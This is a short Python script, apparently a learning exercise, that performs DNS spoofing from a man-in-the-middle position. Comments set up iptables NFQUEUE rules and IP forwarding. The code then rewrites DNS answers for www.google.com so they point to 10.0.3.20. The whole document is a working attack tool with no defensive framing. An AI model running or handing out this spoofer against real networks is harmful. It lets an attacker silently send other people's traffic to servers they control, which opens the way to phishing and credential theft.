# create a queue to trap the responses when the machine act as man in the middle
# iptables -I FORWARD -j NFQUEUE --queue-num 1
# sudo iptables -D FORWARD
# from python I can interact with the created queue

# apt-get update
# apt-get -y install libnetfilter-queue-dev
# sudo pip3 install --upgrade -U  git+https://github.com/kti/python-netfilterqueue
# pip install netfilterqueue

# sudo sysctl -w net.ipv4.ip_forward=1
# sudo sysctl -w net.ipv4.ip_forward=0
# sudo "echo 1 > /proc/sys/net/ipv4/ip_forward"
# sudo "echo 0 > /proc/sys/net/ipv4/ip_forward"

# sudo iptables --flush

# as a test on local pc I redirect the INPUT and OUTPUT chain instead of the FORWARD
# iptables -I OUTPUT -j NFQUEUE --queue-num 1
# iptables -I INPUT -j NFQUEUE --queue-num 1

# sudo service apache2 start

from netfilterqueue import NetfilterQueue
import scapy.all as scapy


# import netfilterqueue


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # scapy_packet.show()
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in str(qname):
            print(str(qname))

            # print(scapy_packet.show())
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.3.20")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            scapy_packet.show()
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
